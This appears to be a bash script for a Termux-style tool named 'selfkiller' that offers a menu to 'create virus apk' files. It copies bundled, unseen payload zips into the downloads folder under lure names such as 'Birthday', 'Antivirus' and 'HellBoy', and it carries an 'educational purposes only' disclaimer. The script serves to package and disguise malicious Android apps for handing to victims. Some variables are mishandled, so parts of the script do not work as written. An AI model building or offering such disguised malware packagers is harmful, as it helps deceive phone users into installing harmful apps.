#!/usr/bin/env bash

readthisone() {
	echo ""
	echo "######################################################"
	echo "######################################################"
	echo "##################### READ THIS ######################"
	echo "######################################################"
	echo "######################################################"
	echo "## Dear GitHub user, please do not copy this script ##"
	echo "######################################################"
	echo "##  All copyright under the laws of all countries   ##"
	echo "######################################################"
	echo "##        Copyright of  GH05T HUNTER5, 2023         ##"
	echo "######################################################"
	echo "######################################################"
	
	
	
	echo "#######################################################################################"
	echo "#######################################################################################"
	echo "##   selfkiller 	: 	create virus apk         			           ##"
	echo "##   Authors 		: 	GH05T-HUNTER5				           ##"
	echo "##   Version 		: 	1.0.9			                           ##"
	echo "##   Github 		: 	https://github.com/GH05T-HUNTER5/selfkiller       ##"
	echo "#######################################################################################"
	echo "##  MIT License 				                                           ##"
	echo "##								                   ##"
	echo "##  Copyright (c) 2023 GH05T HUNTER5 						   ##"
	echo "##										   ##"
	echo "##  Permission is hereby granted, free of charge, to any person obtaining a copy     ##"
	echo "##  of this software and associated documentation files (the "Software"), to deal    ##"
	echo "##  in the Software without restriction, including without limitation the rights     ##"
	echo "##  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell        ##"
	echo "##  copies of the Software, and to permit persons to whom the Software is            ##"
	echo "##  furnished to do so, subject to the following conditions:                         ##"
	echo "##                                                                                   ##"
	echo "##  The above copyright notice and this permission notice shall be included in all   ##"
	echo "##  copies or substantial portions of the Software.                                  ##"
	echo "##  										   ##"
	echo "##  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR       ##"
	echo "##  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,         ##"
	echo "##  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE      ##"
	echo "##  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER           ##"
	echo "##  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,    ##"
	echo "##  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE    ##"
	echo "##  SOFTWARE.          								   ##"
	echo "#######################################################################################"
	echo "#######################################################################################"	
}

ctrl_c() {
	clear
	banner_main
	echo -e "${red} [${white}++${red}] ${cyan}Thanks for using this tool and have a nice day..."
	exit
}

trap ctrl_c INT

if [[ -f .agree ]]; then
	echo "" 
else
	echo "This is for educational purposes only. We are not responsible for any problem."
	sleep 3
	touch .agree
fi
if [[ -d apkvirus ]]; then
	echo ""
else
	mkdir apkvirus
fi


system_path() {
	if [[ -d /data/data/com.termux/files/home/storage/downloads ]]; then
		sysdown="/data/data/com.termux/files/home/storage/downloads"
	elif [[ -d /home/user/Downloads ]]; then
		sysdown="/home/user/Downloads"
	else
		read -p $' \e[1;31m[\e[0m\e[1;37m++\e[0m\e[1;31m]\e[0m\e[1;36meEnter your download folder path : ' downpath
		sysdown="$downpath"
	fi
}

red="\033[1;31m"
green="\033[1;32m"
white="\033[1;37m"
cyan="\033[1;36m"

elite_apk() {
	cp -r .data/.self/.killer/.files/Security.zip apkvirus/Elite.apk
	cp -r .data/.self/.killer/.files/Security.zip $sysdown/Elite.apk
	save_alert
}

save_alert() {
		banner_main
		echo -e "${red} [${white}++${red}] ${cyan}Creating new virus for you"
		sleep 4
		echo -e "${red} [${white}++${red}] ${cyan}Almost done please wait..."
		sleep 6
		echo -e "${red} [${white}++${red}] ${cyan}apk virus saved successfully"
		sleep 1
		echo -e "${red} [${white}++${red}] ${cyan}check your download folder or apkvirus folder"
		exit
}

hellboy_apk() {
	cp -r .data/.self/.killer/.second/Java-Alert.zip apkvirus/HellBoy.apk
	cp -r .data/.self/.killer/.second/Java-Alert.zip $sysdown/HellBoy.apk
	save_alert
}

create_xxx() {
	banner_main
	echo -e "${red} [${white}++${red}] ${cyan}[Default apk name : Birthday]"
	read -p $' \e[1;31m[\e[0m\e[1;37m++\e[0m\e[1;31m]\e[0m\e[1;36m Do You want to change this name (yes,no) : ' birthday
	if [ -z $birthday ]; then
		apkname="Birthday"
	elif [[ $birthday == "yes" ]] || [[ $birthday == "y" ]] || [[ $birthday == "Yes" ]]; then
		read -p $' \e[1;31m[\e[0m\e[1;37m++\e[0m\e[1;31m]\e[0m\e[1;36m Rename your apk file : ' apkfile
		if [ -z $apkfile ]; then
			apkfile="Birthday"
		fi
		system_path
		cp -r .data/.self/.killer/alert/GH05T-ALERT.zip  apkvirus/$apkfile.apk
		cp -r .data/.self/.killer/alert/GH05T-ALERT.zip $sysdown/$apkfile.apk
		save_alert
	else
		apkname="Birthday"
	fi
	cp -r .data/.self/.killer/alert/GH05T-ALERT.zip  apkvirus/$apkname.apk
	cp -r .data/.self/.killer/alert/GH05T-ALERT.zip $sysdown/$apkname.apk
	save_alert
}

banner_main() {
	clear
	echo -e "${white} +---------------------------------------------+"
	echo -e "${white} |      ${red}  ██████ ▓█████  ██▓      █████▒       ${white}|"
	echo -e "${white} |      ${red}▒██    ▒ ▓█   ▀ ▓██▒    ▓██   ▒        ${white}|"
	echo -e "${white} |      ${red}░ ▓██▄   ▒███   ▒██░    ▒████ ░        ${white}|"
	echo -e "${white} |      ${red}  ▒   ██▒▒▓█  ▄ ▒██░    ░▓█▒  ░        ${white}|"
	echo -e "${white} |      ${red}▒██████▒▒░▒████▒░██████▒░▒█░           ${white}|"
	echo -e "${white} |      ${red}▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░▓  ░ ▒ ░           ${white}|"
	echo -e "${white} |      ${red}░ ░▒  ░ ░ ░ ░  ░░ ░ ▒  ░ ░             ${white}|"
	echo -e "${white} |      ${red}░  ░  ░     ░     ░ ░    ░ ░           ${white}|"
	echo -e "${white} |      ${red}      ░     ░  ░    ░  ░               ${white}|"               
	echo -e "${white} | ${red} ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███   ${white}|" 
	echo -e "${white} | ${red} ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒ ${white}|"
	echo -e "${white} | ${red}▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒ ${white}|"
	echo -e "${white} | ${red}▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄   ${white}|"
	echo -e "${white} | ${red}▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒ ${white}|"
	echo -e "${white} | ${red}▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░ ${white}|"
	echo -e "${white} | ${red}░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░ ${white}|"
	echo -e "${white} | ${red}░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░  ${white}|"
	echo -e "${white} | ${red} ░  ░    ░      ░  ░    ░  ░   ░  ░   ░     ${white}|"
	echo -e "${white} +---------------------------------------------+"
	echo -e "${white} |        ${cyan} Created by ${white}:${red} GH05T-HUNTER5          ${white}|"
	echo -e "${white} |               ${cyan}Version ${white}:${red} 1.0.9               ${white}|"
 	echo -e "${white} +---------------------------------------------+"
}

main_menu() {
	banner_main
	echo -e "${red} [${white}01${red}] ${cyan}Create Xxx apk virus ${white}{${red}Powerful${white}}"
	echo -e "${red} [${white}02${red}] ${cyan}Create fake antivirus apk ${white}{${green}Virus apk${white}}"
	echo -e "${red} [${white}03${red}] ${cyan}HellBoy apk virus"
	echo -e "${red} [${white}04${red}] ${cyan}Elite apk virus ${white}[${green}code : 02${white}]"
	echo -e "${red} [${white}00${red}] ${cyan}Exit"
	read -p $' \e[1;31m[\e[0m\e[1;37m++\e[0m\e[1;31m] \e[0m\e[1;36mChoose an option : \e[0m' option
	if [ -z $option ]; then
		main_menu
	elif [[ $option == 01 ]] || [[ $option == 1 ]]; then
		create_xxx
	elif [[ $option == 02 ]] || [[ $option == 2 ]]; then
		create_anti
	elif [[ $option == 03 ]] || [[ $option == 3 ]]; then
		hellboy_apk
	elif [[ $option == 04 ]] || [[ $option == 4 ]]; then
		elite_apk
	elif [[ $option == 00 ]]; then
		exit
	else
		echo -e " ${red}[${white}++${red}] ${red}Invalid Option, Try Again"
		sleep 2
		main_menu
	fi
}

create_anti() {
	banner_main
	echo -e "${red} [${white}++${red}] ${cyan}[Default apk name : Antivirus]"
	read -p $' \e[1;31m[\e[0m\e[1;37m++\e[0m\e[1;31m]\e[0m\e[1;36m Do You want to change this name (yes,no) : ' birthday
	if [ -z $antiapk ]; then
		apkname="Antivirus"
	elif [[ $antiapk == "yes" ]] || [[ $antiapk == "y" ]] || [[ $antiapk == "Yes" ]]; then
		read -p $' \e[1;31m[\e[0m\e[1;37m++\e[0m\e[1;31m]\e[0m\e[1;36m Rename your apk file : ' apkfile
		if [ -z $apkfile ]; then
			apkfile="Antivirus"
		fi
		system_path
		cp -r .data/.self/.killer/.files/Security.zip apkvirus/$apkfile.apk
		cp -r .data/.self/.killer/.files/Security.zip $sysdown/$apkfile.apk
		save_alert
	else
		apkname="Antivirus"
	fi
	cp -r .data/.self/.killer/.files/Security.zip apkvirus/$apkname.apk
	cp -r .data/.self/.killer/.files/Security.zip $sysdown/$apkname.apk
	save_alert
}

main_menu
